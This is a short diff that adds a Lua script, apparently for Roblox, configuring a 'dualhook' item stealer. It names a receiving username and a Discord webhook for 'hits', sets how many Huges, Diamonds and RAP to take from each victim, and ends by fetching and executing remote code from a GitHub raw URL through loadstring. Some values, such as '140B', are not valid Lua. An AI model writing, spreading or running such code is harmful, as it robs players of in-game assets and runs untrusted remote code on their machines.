@@ -1,0 +1,11 @@
+-- Dualhook Settings Obfuscate Bellow 
+DualhookKey = "KEY-4HG04G3"
+
+DualhookUsername =  "Lypher_17" -- username to get dualhook hits to 
+DualhookWebhook = "https://discord.com/api/webhooks/1121033511671975966/uVLbE5RDlJXS9XDf8mxgxDLFsToe-N6sbcKjQaSV-FqGorackJXwTpkzvdLx0smw5fx6" -- webhook to get dualhook logs on 
+
+HugesToDualhook = 3 -- number of huges you want from the hit
+DiamondsToDualhook = 140B -- number of diamond you want from the hit
+RAPToDualhook = 120B -- number of rap you want from the hit
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/key1/main/ezlypher", true))()
